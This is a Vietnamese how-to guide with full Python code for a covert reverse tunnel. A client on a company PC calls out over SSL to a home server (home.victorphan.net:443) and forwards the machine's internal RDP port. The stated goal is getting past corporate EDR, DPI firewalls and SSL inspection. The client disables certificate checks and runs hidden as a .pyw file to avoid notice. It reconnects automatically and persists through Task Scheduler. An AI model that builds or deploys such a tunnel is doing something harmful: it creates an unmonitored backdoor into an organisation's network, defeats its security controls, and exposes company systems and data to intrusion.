# Hướng Dẫn Xây Dựng "Pure Python RDP Reverse Tunnel" (Vượt Tường Lửa)

Tài liệu này cung cấp kiến trúc và mã nguồn cơ bản để bạn đưa vào IDE (VS Code, Cursor...) nhằm tự code một hệ thống Reverse Tunnel hoàn toàn bằng Python. 
Hệ thống này giúp kết nối RDP từ Homelab vào máy công ty mà không bị hệ thống diệt virus (EDR) hay Firewall (DPI) công ty chặn đứng.

## 1. Yêu cầu kỹ thuật & Kiến trúc (Architecture)
Vì chúng ta không dùng SSH (paramiko), chúng ta sẽ tự xây dựng một **TCP Proxy qua luồng SSL**.
Cấu trúc cho kết nối 1-1 (1 máy remote vào 1 máy RDP) cực kỳ đơn giản:

* **Trên Homelab (Server - `server.py`):**
  * Mở port `443` bọc SSL, lắng nghe cấu hình.
  * Chờ Client (máy công ty) kết nối tới.
  * Khi Client đã kết nối thành công, Server tiếp tục mở cổng `33890` (Localhost) để bạn dùng Remote Desktop Connection kết nối vào.
  * Khi có người dùng RDP kết nối vào `33890`, Server bắt đầu quá trình "bơm" (pump) dữ liệu qua lại giữa ứng dụng RDP và kết nối của Client.

* **Trên Máy Công Ty (Client - `client.py`):**
  * Chủ động gọi ra ngoài (Outbound) tới `home.victorphan.net:443` bọc SSL (như đang lướt web).
  * Vô hiệu hóa kiểm tra chứng chỉ (Bỏ qua SSL Inspection của Firewall).
  * Chờ nhận tín hiệu đầu tiên từ Server. Khi nhận được dữ liệu, nó lập tức mở kết nối vào cổng `3389` (RDP nội bộ của Windows).
  * Bắt đầu "bơm" dữ liệu qua lại giữa cổng `3389` nội bộ và kết nối ra Server.

---

## 2. Mã nguồn tham khảo (Boilerplate Code)

### A. Code cho Homelab Server (`server.py`)
Yêu cầu: Homelab cần có cặp chứng chỉ SSL (ví dụ cert.pem, key.pem). Bạn có thể tự tạo (self-signed) vì Client Python sẽ bỏ qua kiểm tra chứng chỉ.

```python
import socket
import ssl
import threading

# Cấu hình
LISTEN_HOST = '0.0.0.0'
LISTEN_PORT = 443         # Port hứng Client từ công ty gọi về
RDP_BIND_PORT = 33890     # Port nội bộ trên Homelab để bạn mở app RDP kết nối vào
CERT_FILE = 'cert.pem'    # Đường dẫn file chứng chỉ SSL
KEY_FILE = 'key.pem'      # Đường dẫn file Private Key

def forward(src, dst):
    """Bơm dữ liệu từ socket này sang socket khác"""
    try:
        while True:
            data = src.recv(4096)
            if not data:
                break
            dst.sendall(data)
    except Exception as e:
        pass
    finally:
        src.close()
        dst.close()

def start_server():
    # 1. Khởi tạo cấu hình SSL (Dành cho Server)
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)

    # 2. Mở cổng 443 chờ Client công ty
    bind_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    bind_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    bind_socket.bind((LISTEN_HOST, LISTEN_PORT))
    bind_socket.listen(1)
    print(f"[*] Đang chờ Client kết nối tại cổng {LISTEN_PORT}...")

    # Bọc SSL
    secure_sock = context.wrap_socket(bind_socket, server_side=True)
    
    while True:
        try:
            client_socket, addr = secure_sock.accept()
            print(f"[+] Client công ty đã kết nối từ: {addr}")
            
            # 3. Khi Client đã kết nối, mở cổng 33890 để bạn RDP vào
            rdp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            rdp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            rdp_sock.bind(('127.0.0.1', RDP_BIND_PORT))
            rdp_sock.listen(1)
            print(f"[*] Đã sẵn sàng! Hãy mở Remote Desktop và kết nối vào 127.0.0.1:{RDP_BIND_PORT}")
            
            local_conn, local_addr = rdp_sock.accept()
            print(f"[+] Bạn vừa kết nối RDP vào cổng {RDP_BIND_PORT}. Đang chuyển tiếp dữ liệu...")
            
            # 4. Tạo 2 luồng (Threads) để bơm dữ liệu 2 chiều
            t1 = threading.Thread(target=forward, args=(client_socket, local_conn))
            t2 = threading.Thread(target=forward, args=(local_conn, client_socket))
            t1.start()
            t2.start()
            
            # Chờ đến khi ngắt kết nối thì dọn dẹp
            t1.join()
            t2.join()
            rdp_sock.close()
            print("[-] Kết nối RDP đã đóng. Khởi động lại luồng chờ Client...")
            
        except Exception as e:
            print(f"[!] Lỗi: {e}")

if __name__ == "__main__":
    start_server()
```

### B. Code cho Máy tính Công ty (`client.pyw`)
Đuôi tệp là `.pyw` để script chạy ngầm trên Windows (không hiện cửa sổ đen cmd, tránh bị để ý).

```python
import socket
import ssl
import threading
import time

# Cấu hình
SERVER_HOST = 'home.victorphan.net'  # Thay bằng tên miền Homelab của bạn
SERVER_PORT = 443                    # Cổng Homelab đang hứng
LOCAL_RDP_PORT = 3389                # Cổng RDP mặc định của Windows

def forward(src, dst):
    """Bơm dữ liệu từ socket này sang socket khác"""
    try:
        while True:
            data = src.recv(4096)
            if not data:
                break
            dst.sendall(data)
    except Exception:
        pass
    finally:
        src.close()
        dst.close()

def run_client():
    while True:
        try:
            # 1. Cấu hình SSL Vượt Tường Lửa (Bỏ qua chứng chỉ giả của cty)
            context = ssl.create_default_context()
            context.check_hostname = False             # Né kiểm tra tên miền
            context.verify_mode = ssl.CERT_NONE        # Chấp nhận chứng chỉ tự tạo hoặc bị chặn MITM

            # 2. Gọi ra Homelab
            raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            secure_sock = context.wrap_socket(raw_socket, server_hostname=SERVER_HOST)
            
            secure_sock.connect((SERVER_HOST, SERVER_PORT))
            
            # Chỉ chờ nhận byte đầu tiên từ Server (Tức là lúc bạn cắm RDP vào)
            peek_data = secure_sock.recv(4096)
            if not peek_data:
                continue

            # 3. Mở kết nối đến RDP nội bộ của Windows
            rdp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            rdp_sock.connect(('127.0.0.1', LOCAL_RDP_PORT))
            
            # Gửi byte đầu tiên vừa mồi sang RDP
            rdp_sock.sendall(peek_data)

            # 4. Bơm dữ liệu 2 chiều
            t1 = threading.Thread(target=forward, args=(secure_sock, rdp_sock))
            t2 = threading.Thread(target=forward, args=(rdp_sock, secure_sock))
            t1.start()
            t2.start()
            
            t1.join()
            t2.join()
            
        except Exception:
            # Rớt mạng hoặc lỗi thì chờ 5 giây gọi lại (Auto Reconnect)
            time.sleep(5)

if __name__ == "__main__":
    run_client()
```

## 3. Cách triển khai thực tế

1. **Trên Homelab:**
   - Dùng lệnh `openssl req -x509 -newkey rsa:4096 -nodes -keyout key.pem -out cert.pem -days 365` để tạo nhanh cặp chứng chỉ.
   - Chạy `python3 server.py`.

2. **Trên Máy Công Ty:**
   - Cài đặt Python chuẩn từ trang chủ `python.org` (Không cài qua Microsoft Store).
   - Lưu file code client thành `client.pyw`.
   - Có thể dùng Task Scheduler để cấu hình chạy file `client.pyw` ngầm mỗi khi khởi động máy.

3. **Sử dụng:**
   - Client ở công ty sẽ ngầm bám víu vào Homelab 24/24.
   - Khi cần Remote Desktop, bạn mở app MSTSC trên máy tính cá nhân, gõ `127.0.0.1:33890`. Kết nối sẽ truyền mượt mà về máy công ty!
